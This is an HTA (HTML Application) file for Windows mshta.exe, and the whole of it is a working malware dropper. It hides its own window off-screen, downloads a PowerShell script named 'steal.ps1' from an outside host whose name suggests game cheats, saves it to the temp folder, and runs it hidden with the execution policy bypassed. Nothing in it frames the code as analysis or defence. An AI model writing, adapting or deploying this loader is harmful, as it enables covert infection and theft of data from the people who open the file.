<!-- language: HTML/HTA, file: file.hta -->
<!-- target: Windows 10/11, mshta.exe -->
<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
<script language="VBScript">
' --- FAST FLASH (Off-screen, 1.5s to allow download) ---
window.resizeTo 0,0
window.moveTo -2000, -2000
SetTimeout "window.close()", 1500

On Error Resume Next

Dim sh, xh, psf, fso
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Download the PowerShell payload from your server
psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xh.Open "GET", "https://cheatz.up.railway.app/steal.ps1", False
xh.Send

If xh.Status = 200 Then
    Dim f: Set f = fso.CreateTextFile(psf, True)
    f.Write xh.responseText
    f.Close
    Set f = Nothing
    
    ' Run hidden and detached
    sh.Run "powershell -NoP -NonI -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, False
End If

SetTimeout "window.close()", 1500
</script>
</head><body></body></html>
